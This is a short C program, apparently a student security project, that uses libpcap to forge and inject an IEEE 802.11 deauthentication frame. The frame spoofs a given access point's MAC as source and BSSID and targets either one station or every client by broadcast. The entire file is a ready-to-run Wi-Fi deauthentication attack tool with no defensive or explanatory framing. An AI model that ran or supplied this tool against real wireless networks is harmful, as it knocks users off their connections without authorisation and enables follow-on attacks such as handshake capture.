#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <netinet/ether.h>
#include <pcap.h>


pcap_t *handle;
uint8_t apmac[6], destmac[6];

char *dev, errbuf[PCAP_ERRBUF_SIZE];


int setup_pcap(char *inf_name)
{
    struct bpf_program fp;

    bpf_u_int32 mask;
    bpf_u_int32 net;

    char filter_exp[] = "";

    dev = inf_name;
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }

    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return(2);
    }

    return 0;
}

 
int main(int argc, char *argv[])
{
	char *name = "신동민";
	char deauth_pckt[] = "\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\x3a\x01"
			     "\xff\xff\xff\xff\xff\xff\x3c\xa3\x15\x01\xa5\x1a\x3c\xa3\x15\x01"
			     "\xa5\x1a\x00\x00\x07\x00";

	printf("[bob5proj]send_deauth[%s]\n", name);
	if(argc < 3 || argc > 4) {
		printf("usage : %s <interface name> <AP mac> [station mac]\n", argv[0]);
		return -1;
	}

	if(argc == 4) {
		memcpy(destmac, ether_aton(argv[3]), 6);
		memcpy(&deauth_pckt[16], destmac, 6);	// 'destination address' field in IEEE 802.11 header
	}

	setup_pcap(argv[1]);
	memcpy(apmac, ether_aton(argv[2]), 6);
	memcpy(&deauth_pckt[22], apmac, 6);		// 'source address' field in IEEE 802.11 header
	memcpy(&deauth_pckt[28], apmac, 6);		// 'BSSID' field in IEEE 802.11 header

	pcap_sendpacket(handle, deauth_pckt, 38);
	return 0;
}

